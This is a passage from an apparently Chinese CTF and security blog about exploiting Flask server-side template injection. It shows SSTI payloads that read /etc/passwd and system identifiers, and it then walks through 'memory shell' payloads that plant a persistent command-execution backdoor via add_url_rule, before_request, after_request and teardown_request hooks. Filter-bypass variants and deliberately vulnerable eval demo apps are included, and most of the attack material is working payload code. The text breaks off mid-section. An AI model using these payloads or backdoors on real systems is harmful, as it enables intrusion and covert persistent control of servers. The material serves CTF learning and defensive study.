<p>或者直接使用赛博厨子也行（因为有不可见字符，所以加了 urlencode）</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515220803321.png" alt="image-20240515220803321"></p>
<p>这里有waf，应该改过滤了base等，这道题是python2，可以利用file类直接读文件，使用代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/etc/passwd&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>不知道为什么app.py读不了</p>
<p>这里就可以得到<br><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515213503173.png" alt="image-20240515213503173"></p>
<p>用户名应该为glzjin，</p>
<p>随便输得到<code>/usr/local/lib/python2.7/site-packages/flask/app.py</code></p>
<p>再使用如下语句：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__mro__.__getitem__(<span class="number">2</span>).__subclasses__().pop(<span class="number">40</span>)(<span class="string">&#x27;/sys/class/net/eth0/address&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>分别得到<code>be:3e:db:1a:cd:fa</code>即·209177173216762·</p>
<p>再获得机器码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&#123;% <span class="keyword">for</span> c <span class="keyword">in</span> [].__class__.__base__.__subclasses__() %&#125;&#123;% <span class="keyword">if</span> c.__name__==<span class="string">&#x27;catch_warnings&#x27;</span> %&#125;&#123;&#123; c.__init__.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>].<span class="built_in">open</span>(<span class="string">&#x27;/proc/self/cgroup&#x27;</span>,<span class="string">&#x27;r&#x27;</span>).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<p>但是我这里环境可能有点问题，直接看<code>/etc/machine-id</code>和<code>/proc/sys/kernel/random/boot_i</code>也没有，而<code>/proc/self/cgroup</code>又没有，没办法。</p>
<p>这里主要是为了将python2与python3对比，但这里<a href="https://xz.aliyun.com/t/8092?time__1311=n4+xuDgDBADQYiKP40HwbDyiDcDjr2qGIKNUQYx&alichlgref=https://www.google.com.hk/#toc-5">有个文章</a>是用这个方法打出来的，<strong>就是需要注意那个app.py，得到后使用时需要改为<code>app.pyc</code>。</strong></p>
<p>这道题的可直接ssti得flag的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__[&#x27;os&#x27;].popen(&#x27;nl /f*&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<p><img src="/2024/05/16/Python%20Debug%20PIN%E7%A0%81%E7%9A%84%E5%88%A9%E7%94%A8/image-20240515223545094.png" alt="image-20240515223545094"></p>
]]></content>
      <categories>
        <category>Python漏洞</category>
        <category>debug pin码的利用</category>
      </categories>
  </entry>
  <entry>
    <title>Python内存马探究</title>
    <url>/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>比较重要，利用面挺广的</p>
<span id="more"></span>

<h1 id="Python内存马分析"><a href="#Python内存马分析" class="headerlink" title="Python内存马分析"></a>Python内存马分析</h1><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>常用的<code>Python</code>框架有<code>Django</code>、<code>Flask</code>, 这两者都可能存在<code>SSTI</code>漏洞. <code>Python内存马</code>利用<code>Flask</code>框架中<code>SSTI</code>注入来实现，<code>Flask</code>框架中在<code>web</code>应用模版渲染的过程用到**<code>render_template_string</code>**函数进行渲染, 但未对用户传输的代码进行过滤导致用户可以通过注入恶意代码来实现<code>Python</code>内存马的注入</p>
<h3 id="Flask-请求上下文管理机制"><a href="#Flask-请求上下文管理机制" class="headerlink" title="Flask 请求上下文管理机制"></a>Flask 请求上下文管理机制</h3><p>当网页请求进入<code>Flask</code>时，会实例化一个<code>Request Context</code>。在<code>Python</code>中分出了两种上下文：请求上下文（request context）、应用上下文（session context）。一个请求上下文中封装了请求的信息，而上下文结构是运用了一个<code>Stack</code>的栈结构，也就是说它拥有一个栈所拥有的全部特性。<code>request context</code>实例化后会被<code>push</code>到栈<code>_request_ctx_stack</code>中, 基于此特性便可以通过获取栈顶元素的方法来获取当前的请求.</p>
<h3 id="旧版Flask内存马分析"><a href="#旧版Flask内存马分析" class="headerlink" title="旧版Flask内存马分析"></a>旧版<code>Flask</code>内存马分析</h3><p>可以编写一个demo</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():  <span class="comment"># put application&#x27;s code here</span></span><br><span class="line">    person = <span class="string">&#x27;knave&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&#x27;name&#x27;</span>):</span><br><span class="line">        person = request.args.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    template = <span class="string">&#x27;&lt;h1&gt;Hi, %s.&lt;/h1&gt;&#x27;</span> % person</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run()</span><br><span class="line">    </span><br></pre></td></tr></table></figure>

<p>原始<code>Flask</code>内存马<code>Payload</code>：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<p>在成功运行后就可以在<code>/shell?cmd=ls</code>执行命令。</p>
<p><strong>注意：如果想在其他地方利用就需要加上<code>render_template_string()函数</code>，就是将payload改成符合格式后包含到这个函数当中。</strong>比如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmd=render_template_string(<span class="string">&quot;&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](\&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())\&quot;,&#123;&#x27;_request_ctx_stack&#x27;:url_for.__globals__[&#x27;_request_ctx_stack&#x27;],&#x27;app&#x27;:url_for.__globals__[&#x27;current_app&#x27;]&#125;)&#125;&#125;&quot;</span>)</span><br><span class="line"></span><br><span class="line">同时结合下面的payload的分析，直接<span class="built_in">eval</span>(<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;,&#x27;shell&#x27;,lambda:__import__(&#x27;os&#x27;).popen(&#x27;cat /flag&#x27;).read())&quot;</span>)也行</span><br></pre></td></tr></table></figure>

<p><strong>局限：</strong></p>
<p>在现在新版<code>Flask</code>使用这个payload会出现以下问题：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AssertionError: The setup method &#x27;add_url_rule&#x27; can no longer be called on the application. It has already handled its first request, any changes will not be applied consistently.</span><br><span class="line">Make sure all imports, decorators, functions, etc. needed to set up the application are done before running it.</span><br></pre></td></tr></table></figure>

<p>这说明新版<code>Flask</code>无法再在应用程序上调用安装方法<code>&quot;add_url_rule&quot;</code>，所以应该是用不了这个方法的，下面了解一下思想即可，但遇到题的时候还是可以先试试这个方法。</p>
<h4 id="Payload分析"><a href="#Payload分析" class="headerlink" title="Payload分析"></a>Payload分析</h4><p>将payload拆分开，逐层分析</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">url_for.__globals__[<span class="string">&#x27;__builtins__&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;app.add_url_rule(&#x27;/shell&#x27;, &#x27;shell&#x27;, lambda :__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read())&quot;</span>,&#123;<span class="string">&#x27;_request_ctx_stack&#x27;</span>:url_for.__globals__[<span class="string">&#x27;_request_ctx_stack&#x27;</span>],<span class="string">&#x27;app&#x27;</span>:url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>]&#125;)</span><br></pre></td></tr></table></figure>

<h6 id="第一部分"><a href="#第一部分" class="headerlink" title="第一部分"></a>第一部分</h6><p>对于<code>url_for.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;]</code>这一截，<code>url_for</code>是<code>Flask</code>的一个内置函数，通过<code>Flask</code>内置函数可以调用其<code>__global__</code>属性，该特殊属性能够返回函数所在模块命名空间的所有变量，其中包含了很多已经引入得<code>modules</code>，可以看到这里是支持<code>__builtins__</code>的。</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518143651820.png" alt="image-20240518143651820"></p>
<p><strong>在<code>__builtins__</code>模块中，<code>Python</code>在启动时就直接为我们导入了很多内建函数</strong>，准确的说，<code>python</code>在启动时会首先加载内建名称空间，内建名称空间中有许多名字到对象之间的映射, 这些名字就是内建函数的名称, 对象就是这些内建函数对象。现在再来跟进一下<code>__builtins__</code>模块：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518144123444.png" alt="image-20240518144123444"></p>
<p>可以看到，在<code>__builtins__</code>模块中存在eval、exec等命令执行函数的。</p>
<p>此时在ssti中就可以尝试直接进行rce，如下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;url_for.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;](&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;)&#125;&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518204521230.png" alt="image-20240518204521230"></p>
<h6 id="第二部分"><a href="#第二部分" class="headerlink" title="第二部分"></a>第二部分</h6><p>现在继续看<code>app.add_url_rule(&#39;/shell&#39;, &#39;shell&#39;, lambda  :__import__(&#39;os&#39;).popen(_request_ctx_stack.top.request.args.get(&#39;cmd&#39;,  &#39;whoami&#39;)).read())</code>这一截payload，分析一下代码：</p>
<ol>
<li><ul>
<li><p>这行代码使用 Flask 的 <code>add_url_rule</code> 方法来添加一个路由规则。</p>
</li>
<li><p>第一个参数 <code>&#39;/shell&#39;</code> 是 URL 规则的路径。</p>
</li>
<li><p>第二个参数 <code>&#39;shell&#39;</code> 是视图函数的名称。</p>
</li>
<li><p>第三个参数是一个 lambda 表达式，它定义了视图函数的行为。</p>
<ul>
<li><p>lambda 表达式没有参数，因此 <code>lambda:</code> 后面没有任何参数列表。</p>
</li>
<li><p>lambda 表达式的主体部分 </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">__import__(&#x27;os&#x27;).popen(_request_ctx_stack.top.request.args.get(&#x27;cmd&#x27;, &#x27;whoami&#x27;)).read()</span><br></pre></td></tr></table></figure>

<p> 是一个表达式，它执行了如下操作：</p>
<ul>
<li>从请求上下文堆栈 <code>_request_ctx_stack.top</code> 中获取请求对象 <code>request</code>。</li>
<li>使用 <code>request.args.get(&#39;cmd&#39;, &#39;whoami&#39;)</code> 获取名为 <code>&#39;cmd&#39;</code> 的请求参数，如果没有指定 <code>&#39;cmd&#39;</code> 参数，则默认为 <code>&#39;whoami&#39;</code>。</li>
<li>将获取到的命令传递给 <code>os.popen()</code> 函数执行，并读取其输出。</li>
</ul>
</li>
</ul>
</li>
<li><p>因此，这行代码添加了一个能够执行命令的路由规则。</p>
</li>
</ul>
</li>
<li><p>lambda 表达式：</p>
<ul>
<li>lambda 表达式是一种匿名函数，它可以在不使用 <code>def</code> 关键字的情况下创建函数。</li>
<li>lambda 表达式的一般形式是 <code>lambda 参数列表: 表达式</code>。</li>
<li>lambda 表达式的主要优点是可以在一行内定义简单的函数。</li>
</ul>
</li>
</ol>
<p>这段代码的意图是添加一个路由规则，使得通过访问 <code>/shell</code> 路径并传递命令参数可以执行命令，并返回其输出结果。Lambda 表达式被用于定义这个简单的视图函数。</p>
<p>而在<code>Flask</code>中注册路由的时候是由<code>@app.route()</code>装饰器来实现的，跟进源码看看</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518205342399.png" alt="image-20240518205342399"></p>
<p>确实就是调用的<code>add_url_rule()</code>函数来添加路由。</p>
<h6 id="第三部分"><a href="#第三部分" class="headerlink" title="第三部分"></a>第三部分</h6><p>**先说明一下为什么在第二部分与第三部分之间要用<code>,</code>**：</p>
<p>在这个代码片段中，逗号 <code>,</code> 的作用是将两个参数传递给 <code>eval</code> 函数。在 Python 中，<code>eval</code> 函数可以接受两个参数：第一个参数是要执行的代码字符串，第二个参数是一个字典，用于指定 <code>eval</code> 函数执行代码时的全局和局部命名空间。</p>
<p>其中第三部分就属于<code>eval函数</code>的第二个参数，其中包含了两个键值对：</p>
<ol>
<li><code>&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;]</code>：将 <code>_request_ctx_stack</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</li>
</ol>
<p>​    2.<code>&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]</code>：将 <code>current_app</code> 对象作为全局命名空间的一部分传递给 <code>eval</code> 函数。</p>
<p>这样做的目的是为了让 <code>eval</code> 函数在执行代码时能够访问到 <code>app</code> 和 <code>_request_ctx_stack</code> 对象，因为这些对象在原始代码中被引用到了。</p>
<p><strong>现在来看最后一部分：</strong><code>&#123;&#39;_request_ctx_stack&#39;:url_for.__globals__[&#39;_request_ctx_stack&#39;],&#39;app&#39;:url_for.__globals__[&#39;current_app&#39;]&#125;</code></p>
<p><code>_request_ctx_stack</code>是<code>Flask</code>的一个全局变量，是一个<code>LocalStack</code>实例, 这里的<code>_request_ctx_stack</code>即上文中提到的<code>Flask 请求上下文管理机制</code>中的<code>_request_ctx_stack</code>. <code>app</code>也是<code>Flask</code>的一个全局变量, 这里即获取当前的<code>app</code>。</p>
<p>到此, 大致逻辑基本就梳理清晰了, <code>eval</code>函数的功能即动态创建一条路由, 并在后面指明了所需变量的全局命名空间, 保证<code>app</code>和<code>_request_ctx_stack</code>都可以被找到.</p>
<h5 id="bypass"><a href="#bypass" class="headerlink" title="bypass"></a>bypass</h5><ul>
<li><code>url_for</code>可替换为<code>get_flashed_messages</code>或者<code>request.__init__</code>或者<code>request.application</code>.</li>
<li>代码执行函数替换, 如<code>exec</code>等替换<code>eval</code>.</li>
<li>字符串可采用拼接方式, 如<code>[&#39;__builtins__&#39;][&#39;eval&#39;]</code>变为<code>[&#39;__bui&#39;+&#39;ltins__&#39;][&#39;ev&#39;+&#39;al&#39;]</code>.</li>
<li><code>__globals__</code>可用<code>__getattribute__(&#39;__globa&#39;+&#39;ls__&#39;)</code>替换.</li>
<li><code>[]</code>可用<code>.__getitem__()</code>或<code>.pop()</code>替换.</li>
<li>过滤<code>&#123;&#123;`或者`&#125;&#125;</code>, 可以使用<code>&#123;%`或者`%&#125;</code>绕过, <code>&#123;%%&#125;</code>中间可以执行<code>if</code>语句, 利用这一点可以进行类似盲注的操作或者外带代码执行结果.</li>
<li>过滤<code>_</code>可以用编码绕过, 如<code>__class__</code>替换成<code>\x5f\x5fclass\x5f\x5f</code>, 还可以用<code>dir(0)[0][0]</code>或者<code>request[&#39;args&#39;]</code>或者<code>request[&#39;values&#39;]</code>绕过.</li>
<li>过滤了<code>.</code>可以采用<code>attr()</code>或<code>[]</code>绕过.</li>
<li>其它的手法参考<code>SSTI</code>绕过过滤的方法即可…</li>
</ul>
<p>还有的关于绕过的变形payload可以在参考文章里面看</p>
<p>参考文章：</p>
<p><code>https://xz.aliyun.com/t/10933?time__1311=mq%2BxB70QD%3D9xlxGgrDyiDcDjOAHr6e%2BYx&amp;alichlgref=https%3A%2F%2Fwww.bing.com%2F#toc-0</code></p>
<h3 id="新版Flask内存马"><a href="#新版Flask内存马" class="headerlink" title="新版Flask内存马"></a>新版<code>Flask</code>内存马</h3><p>正如在上面旧版<code>Flask</code>提出的<code>add_url_rule</code>函数在当前较新的<code>Flask</code>版本已经不再支持在程序运行的过程中通过add_url_rule添加路由了。如下：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518223939172.png" alt="image-20240518223939172"></p>
<p>所以，我们只能通过其他方式添加路由来处理我们的请求。</p>
<p><strong>测试了一下，下面的几种方法无论环境中是否有debug模式都能打。</strong></p>
<h4 id="before-request"><a href="#before-request" class="headerlink" title="before_request"></a>before_request</h4><p>在<code>Flask</code>中，<code>before_request</code>是一个装饰器，<strong>它用于在请求处理之前执行特定的函数</strong>。这个装饰器允许对每个请求进行一些预处理，比如认证检查、日志记录、设置响应头等。</p>
<p>跟一下<code>@app.before_request()</code>装饰器源码：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519125940205.png" alt="image-20240519125940205"></p>
<p>可以在这里看到这个<code>before_request</code>装饰器实际上调用的是<code>self.before_request_funcs.setdefault(None, []).append(f)</code>,解释一下：</p>
<ul>
<li><code>before_request_funcs</code>：是 Flask 应用实例的一个属性，用于存储在每次请求之前执行的函数。</li>
<li><code>setdefault(None, [])</code>：这是一个字典方法，用于设置字典中指定键的默认值。在这里，如果字典中不存在键为 <code>None</code> 的值，就将 <code>None</code> 的默认值设置为一个空列表 <code>[]</code>。</li>
<li><code>.append(f)</code>：无论<code>None</code>键是否存在，都会将传入的函数 <code>f</code> 添加到对应键的列表中，即添加到 <code>before_request_funcs</code> 字典中 <code>None</code> 键对应的列表中。</li>
</ul>
<p>这个函数<code>f</code>就是我们要添加的函数。</p>
<p>写一个源码程序来测试：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>使用如下payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://127.0.0.1:5000/e?cmd=app.before_request_funcs.setdefault(None, []).append(lambda: __import__(&#x27;os&#x27;).popen(&#x27;dir&#x27;).read())</span><br></pre></td></tr></table></figure>

<p><strong>这样后续所有的访问结果都将变为命令执行的结果</strong></p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240518225750706.png" alt="image-20240518225750706"></p>
<p>同样可以改改，结合旧版内存马对payload的分析，比如这样：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cmd=app.before_request_funcs.setdefault(None, []).append(lambda :__import__(&#x27;os&#x27;).popen(request.args.get(&#x27;name&#x27;)).read())</span><br></pre></td></tr></table></figure>

<p>这样就可以同时执行多条命令</p>
<p>同样可以从测试源码中看到想要直接使用可以<code>eval(str($string))</code>这样包裹或者直接<code>eval()</code>包裹也行，测试一下(将返回值改了)：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    a = <span class="built_in">eval</span>(request.args.get(<span class="string">&#x27;cmd&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>不加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134059111.png" alt="image-20240519134059111"></p>
<p><strong>加<code>str()</code>：</strong><br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519134305823.png" alt="image-20240519134305823"></p>
<p>都成功了，但是在测试过程中发现最好还是加上<code>str()</code>函数，虽然都可以执行成功，本地测试过程有点细微差别。</p>
<p>由此可见通过<code>before_request</code>添加内存马这一条路是可行的，但同样会有一点问题，就是使用lambda必然会得到一个返回值，那么服务后续的操作都无法进行，会影响到主机的正常业务。</p>
<h4 id="after-request"><a href="#after-request" class="headerlink" title="after_request"></a>after_request</h4><p>还可以尝试<code>@app.after_request</code>来解决，与<code>@app.before_request</code>类似，**<code>after_request</code>会在请求结束得到响应包之后进行操作**，跟进一下源码看看：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519135826767.png" alt="image-20240519135826767"></p>
<p>底层源码和<code>before_request</code>好像。</p>
<p><code>self.after_request_funcs.setdefault(None, []).append(f)</code>传入的f就是对应的自定义函数，但这里的f需要接受一个reponse对象，同时返回一个reponse对象。</p>
<p>但是我们仅通过lambda无法对原始传进来的reponse进行修改后再返回，所以需要重新生成一个response对象，然后再返回这个response。</p>
<p>访问对应的url为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p>函数的内容为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lambda resp: #传入参数</span><br><span class="line">    CmdResp if request.args.get(&#x27;cmd&#x27;) and      #如果请求参数含有cmd则返回命令执行结果</span><br><span class="line">    exec(&#x27;</span><br><span class="line">        global CmdResp;     #定义一个全局变量，方便获取</span><br><span class="line">        CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())   #创建一个响应对象</span><br><span class="line">    &#x27;)==None    #恒真</span><br><span class="line">    else resp)  #如果请求参数没有cmd则正常返回</span><br><span class="line">#这里的cmd参数名和CmdResp变量名都是可以改的，最好改成服务中不存在的变量名以免影响正常业务</span><br></pre></td></tr></table></figure>

<p>所以利用也是差不多的，本地测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p><strong>有str()函数</strong>：</p>
<p>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=str(app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp))</span><br></pre></td></tr></table></figure>

<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519152944681.png" alt="image-20240519152944681"></p>
<p>注意：不知道为啥我本地测试在原先传入的<code>e</code>路由传入命令不行，需要另外传路由，如上就有正常页面</p>
<p>本地测试显示：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519153125867.png" alt="image-20240519153125867"></p>
<p>但是在一道ctf题（H&amp;NCTF2024 ezFlask）可以直接在原路由进行传入<code>cmd</code>进行rce，但是那道题的<code>flask版本</code>挺低的，<code>add_url_rule()</code>可用并且是post传入cmd来更改路由再get传入的。这里注意一下。</p>
<p><strong>无<code>str()</code>函数：</strong><br>payload:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app.after_request_funcs.setdefault(None, []).append(lambda resp: CmdResp if request.args.get(&#x27;cmd&#x27;) and exec(&#x27;global CmdResp;CmdResp=__import__(\&#x27;flask\&#x27;).make_response(__import__(\&#x27;os\&#x27;).popen(request.args.get(\&#x27;cmd\&#x27;)).read())&#x27;)==None else resp)</span><br></pre></td></tr></table></figure>

<p>如下成功执行：</p>
<p><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519160145954.png" alt="image-20240519160145954"></p>
<p>但是同样有上面那个问题并且在那道题目中可以复现。</p>
<h4 id="teardown-request"><a href="#teardown-request" class="headerlink" title="teardown_request"></a>teardown_request</h4><p>在 Flask 中，每次接收到一个请求并处理完毕后，都会调用 <code>teardown_request()</code> 函数。这个函数可以被开发人员用来释放请求过程中分配的资源或执行其他清理操作。只需要在代码中定义一个函数并使用<code>@app.teardown_request</code> 装饰器即可。Flask 框架会在每个请求处理结束后自动调用这个函数。</p>
<p>看一看这个装饰器的源码：<br><img src="/2024/05/19/Python%E5%86%85%E5%AD%98%E9%A9%AC%E5%88%86%E6%9E%90/image-20240519183513601.png" alt="image-20240519183513601"></p>
<p>和上面那两个方法的源码都挺像的，但是<strong>这个命令执行后无回显</strong>。</p>
<p>payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).system(&#x27;ls&gt;1.txt&#x27;))</span><br><span class="line">或者</span><br><span class="line">?cmd=app.teardown_request_funcs.setdefault(None, []).append(lambda error: __import__(&#x27;os&#x27;).popen(&#x27;ls&gt;5.txt&#x27;).read())</span><br></pre></td></tr></table></figure>

<p>测试一下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/e&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">e</span>():</span><br><span class="line">    <span class="comment"># 获取传入的 cmd 参数，并执行 eval</span></span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> cmd:</span><br><span class="line">        result = <span class="built_in">eval</span>(cmd)</span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;No command provided&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>传入的payload：</p>
